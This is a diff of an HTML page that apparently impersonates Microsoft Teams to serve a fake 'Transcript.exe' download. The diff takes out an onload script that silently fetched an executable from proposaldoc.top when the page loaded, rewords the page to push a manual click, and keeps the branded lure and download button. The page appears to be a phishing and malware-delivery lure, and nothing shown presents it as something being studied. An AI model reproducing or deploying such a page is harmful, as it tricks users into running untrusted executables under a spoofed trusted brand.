@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Transcript Download | Microsoft Teams </title>
+  <title>Transcript Download | Microsoft Teams</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet" />
   <style>
@@ -104,7 +104,7 @@
     <div class="card">
       <img src="https://main-8xt.pages.dev/logo.png" alt="Microsoft Teams Logo" />
       <h1>Transcript Document is Ready</h1>
-      <p>Your secure download will begin automatically.<br>If not, click below:</p>
+      <p>Your secure download is available.<br>Please click the button below:</p>
       <a href="#" onclick="manualDownload()">Download Transcript.exe</a>
     </div>
   </div>
@@ -131,18 +131,8 @@
       toast.style.display = 'block';
       setTimeout(() => {
         toast.style.display = 'none';
-      }, 3000); // hide after 3 seconds
+      }, 3000);
     }
-
-    // Auto-download on page load (no toast)
-    window.onload = function () {
-      const link = document.createElement('a');
-      link.href = 'https://proposaldoc.top/invite/transcript.exe';
-      link.download = '';
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    };
   </script>
 </body>
 </html>
